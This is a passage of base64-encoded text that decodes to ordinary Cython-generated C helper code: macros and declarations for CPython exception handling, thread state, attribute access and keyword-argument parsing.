ZFN0YXRlKiB0c3RhdGUsIFB5T2JqZWN0KiBlcnIpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhlcnIpICBQeUVycl9FeGNlcHRpb25NYXRjaGVzKGVycilcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlICBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGU7XG4jZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduICBfX3B5eF90c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiAhPSBOVUxMKVxuI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA/IChQeU9iamVjdCopIFB5X1RZUEUoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbikgOiAoUHlPYmplY3QqKSBOVUxMKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUgIT0gTlVMTClcbiNkZWZpbmUgX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUpXG4jZW5kaWZcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoUHlFcnJfT2NjdXJyZWQoKSAhPSBOVUxMKVxuI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICBQeUVycl9PY2N1cnJlZCgpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgX19QeXhfRXJyUmVzdG9yZShOVUxMLCBOVUxMLCBOVUxMKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGVfR0VUKCksIHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgICBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZV9HRVQoKSwgdHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJGZXRjaCh0eXBlLCB2YWx1ZSwgdGIpICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZShfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YilcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTZcbiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIChQeV9JTkNSRUYoZXhjKSwgX19QeXhfRXJyUmVzdG9yZSgoZXhjKSwgTlVMTCwgTlVMTCkpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgUHlFcnJfU2V0Tm9uZShleGMpXG4jZW5kaWZcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgUHlFcnJfQ2xlYXIoKVxuI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgUHlFcnJfU2V0Tm9uZShleGMpXG4jZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0VyckZldGNoV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX0ZldGNoKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJGZXRjaCh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9GZXRjaCh0eXBlLCB2YWx1ZSwgdGIpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobyxuKSBQeU9iamVjdF9HZXRBdHRyKG8sbilcbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKTtcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OYW1lKFB5T2JqZWN0ICpuYW1lKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMaXN0X0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKTtcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pO1xuI2VuZGlmXG5cblxuI2luY2x1ZGUgPHN0cmluZy5oPlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUJ5dGVzX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscyk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpO1xuXG5cbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKGFyZ3MsIGkpXG4jZWxpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9OZXdSZWYoX19QeXhfUHlUdXBsZV9HRVRfSVRFTShhcmdzLCBpKSlcbiNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9YTmV3UmVmKFB5VHVwbGVfR2V0SXRlbShhcmdzLCBpKSlcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfVkFSQVJHUyhrd2RzKSBQeURpY3RfU2l6ZShrd2RzKVxuI2RlZmluZSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKGFyZ3MsIG5hcmdzKSBOVUxMXG4jZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfVkFSQVJHUyhrdywga3d2YWx1ZXMsIHMpIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKGt3LCBzKVxuI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfVkFSQVJHUyhrdywga3d2YWx1ZXMpIFB5RGljdF9Db3B5KGt3KVxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoYXJncywgaSkgX19QeXhfTmV3UmVmKGFyZ3NbaV0pXG4gICAgI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoa3dkcykgX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd2RzKVxuICAgICNkZWZpbmUgX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoYXJncywgbmFyZ3MpICgoYXJncykgKyAobmFyZ3MpKVxuICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKnMpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIENZVEhPTl9VTlVTRUQgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMpO1xuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKGt3LCBrd3ZhbHVlcykgX1B5U3RhY2tfQXNEaWN0KGt3dmFsdWVzLCBrdylcbiAgI2VuZGlmXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX0ZBU1RDQUxMIF9fUHl4X0FyZ1JlZl9WQVJBUkdTXG4gICAgI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwgX19QeXhfTnVtS3dhcmdzX1ZBUkFSR1NcbiAgICAjZGVmaW5lIF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMIF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1NcbiAgICAjZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfRkFTVENBTEwgX19QeXhfR2V0S3dWYWx1ZV9WQVJBUkdTXG4gICAgI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwgX19QeXhfS3dhcmdzQXNEaWN0X1ZBUkFSR1NcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfVkFSQVJHUyhhcmdzLCBzdGFydCwgc3RvcCkgUHlUdXBsZV9HZXRTbGljZShhcmdzLCBzdGFydCwgc3RvcClcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCB8fCAoQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTKVxuI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfRkFTVENBTEwoYXJncywgc3RhcnQsIHN0b3ApIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KGFyZ3MgKyBzdGFydCwgc3RvcCAtIHN0YXJ0KVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQXJnc1NsaWNlX0ZBU1RDQUxMKGFyZ3MsIHN0YXJ0LCBzdG9wKSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIHN0YXJ0LCBzdG9wKVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5RGljdF9JdGVtcyhQeU9iamVjdCogZCk7XG5cblxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKVxcXG4gICAgKChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzKVxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uV2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCBrd2FyZ3MpXFxcbiAgICAoKFB5Q0Z1bmN0aW9uV2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MsIGt3YXJncylcbiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIG5hcmdzKVxcXG4gICAgKChfX1B5eF9QeUNGdW5jdGlvbkZhc3QpKHZvaWQoKikodm9pZCkpKFB5Q0Z1bmN0aW9uKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MsIG5hcmdzKVxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpXFxcbiAgICAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSkoUHlDRnVuY3Rpb24pKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdyk7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpIFB5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdylcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpO1xuI2VuZGlmXG5cblxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jLCBhcmdzLCBuYXJncykgIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChmdW5jLCBhcmdzLCAoc2l6ZV90KShuYXJncyksIE5VTEwpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqIGNvbnN0KmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncyk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpO1xuXG5cbnR5cGVkZWYgc3RydWN0IHtcbiAgICBQeU9iamVjdCAqdHlwZTtcbiAgICBQeU9iamVjdCAqKm1ldGhvZF9uYW1lO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmIENZVEhPTl9BVE9NSUNTXG4gICAgX19weXhfYXRvbWljX2ludF90eXBlIGluaXRpYWxpemVkO1xuI2VuZGlmXG4gICAgUHlDRnVuY3Rpb24gZnVuYztcbiAgICBQeU9iamVjdCAqbWV0aG9kO1xuICAgIGludCBmbGFnO1xufSBfX1B5eF9DYWNoZWRDRnVuY3Rpb247XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fR2V0QW5kU2V0SW5pdGlhbGl6aW5nKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMpIHtcbiNpZiAhQ1lUSE9OX0FUT01JQ1NcbiAgICByZXR1cm4gMTtcbiNlbHNlXG4gICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGV4cGVjdGVkID0gMDtcbiAgICBpZiAoX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoJmNmdW5jLT5pbml0aWFsaXplZCwgJmV4cGVjdGVkLCAxKSkge1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIGV4cGVjdGVkO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNmdW5jKSB7XG4jaWYgQ1lUSE9OX0FUT01JQ1NcbiAgICBfX3B5eF9hdG9taWNfc3RvcmUoJmNmdW5jLT5pbml0aWFsaXplZCwgMik7XG4jZW5kaWZcbn1cbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoY2Z1bmMpIDJcbiNkZWZpbmUgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX1NldEZpbmlzaGVkSW5pdGlhbGl6aW5nKGNmdW5jKVxuI2VuZGlmXG5cblxuQ1lUSE9OX1VOVVNFRFxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMChfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZik7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMChfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QwKGNmdW5jLCBzZWxmKSAgX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDAoY2Z1bmMsIHNlbGYpXG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlEaWN0X1ZhbHVlcyhQeU9iamVjdCogZCk7XG5cblxuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG5zdGF0aWMgaW50IF9fUHl4X1B5RGljdF9OZXh0UmVmKFB5T2JqZWN0ICpwLCBQeU9iamVjdCAqKnBwb3MsIFB5T2JqZWN0ICoqcGtleSwgUHlPYmplY3QgKipwdmFsdWUpO1xuI2Vsc2VcbkNZVEhPTl9JTkxJTkVcbnN0YXRpYyBpbnQgX19QeXhfUHlEaWN0X05leHRSZWYoUHlPYmplY3QgKnAsIFB5X3NzaXplX3QgKnBwb3MsIFB5T2JqZWN0ICoqcGtleSwgUHlPYmplY3QgKipwdmFsdWUpO1xuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSwgUHlPYmplY3QqIGt3X25hbWUpO1xuXG5cbnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3Jkc1R1cGxlKFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICogY29uc3QgKmt3dmFsdWVzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLFxuICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSxcbiAgICBQeV9zc2l6ZV90IG51bV9wb3NfYXJncyxcbiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsXG4gICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSxcbiAgICBpbnQgaWdub3JlX3Vua25vd25fa3dhcmdzXG4pO1xuc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmREaWN0VG9EaWN0KFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLFxuICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSxcbiAgICBQeV9zc2l6ZV90IG51bV9wb3NfYXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lXG4pO1xuc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmREaWN0KFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKnZhbHVlc1tdLFxuICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLFxuICAgIFB5X3NzaXplX3QgbnVtX2t3YXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLFxuICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3Ncbik7XG5cblxuQ1lUSE9OX1VOVVNFRFxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnMSwgUHlPYmplY3QgKmFyZzIpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMihjZnVuYywgc2VsZiwgYXJnMSwgYXJnMikgIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1BhcnNlS2V5d29yZHMoXG4gICAgUHlPYmplY3QgKmt3ZHMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLCBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsIFB5X3NzaXplX3QgbnVtX2t3YXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLFxuICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3Ncbik7XG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoY29uc3QgY2hhciogZnVuY19uYW1lLCBpbnQgZXhhY3QsXG4gICAgUHlfc3NpemVfdCBudW1fbWluLCBQeV9zc2l6ZV90IG51bV9tYXgsIFB5X3NzaXplX3QgbnVtX2ZvdW5kKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMFxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9EZWxBdHRyKG8sIG4pIFB5T2JqZWN0X1NldEF0dHIobywgbiwgTlVMTClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0RlbEF0dHIobywgbikgUHlPYmplY3RfRGVsQXR0cihvLCBuKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9EZWxBdHRyU3RyKG8sbikgX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihvLCBuLCBOVUxMKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgUHlPYmplY3QqIHZhbHVlKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0RlbEF0dHJTdHIobyxuKSAgIF9fUHl4X1B5T2JqZWN0X0RlbEF0dHIobyxuKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKG8sbix2KSBQeU9iamVjdF9TZXRBdHRyKG8sbix2KVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiNkZWZpbmUgX19QWVhfRElDVF9WRVJTSU9OX0lOSVQgICgoUFlfVUlOVDY0X1QpIC0xKVxuI2RlZmluZSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpICAoKChQeURpY3RPYmplY3QqKShkaWN0KSktPm1hX3ZlcnNpb25fdGFnKVxuI2RlZmluZSBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShkaWN0LCB2YWx1ZSwgY2FjaGVfdmFyLCB2ZXJzaW9uX3ZhcilcXFxuICAgICh2ZXJzaW9uX3ZhcikgPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpO1xcXG4gICAgKGNhY2hlX3ZhcikgPSAodmFsdWUpO1xuI2RlZmluZSBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChWQVIsIERJQ1QsIExPT0tVUCkge1xcXG4gICAgc3RhdGljIFBZX1VJTlQ2NF9UIF9fcHl4X2RpY3RfdmVyc2lvbiA9IDA7XFxcbiAgICBzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlID0gTlVMTDtcXFxuICAgIGlmIChsaWtlbHkoX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihESUNUKSA9PSBfX3B5eF9kaWN0X3ZlcnNpb24pKSB7XFxcbiAgICAgICAgKFZBUikgPSBfX1B5eF9YTmV3UmVmKF9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKTtcXFxuICAgIH0gZWxzZSB7XFxcbiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IChMT09LVVApO1xcXG4gICAgICAgIF9fcHl4X2RpY3RfdmVyc2lvbiA9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oRElDVCk7XFxcbiAgICB9XFxcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF90cF9kaWN0X3ZlcnNpb24oUHlPYmplY3QgKm9iaik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihQeU9i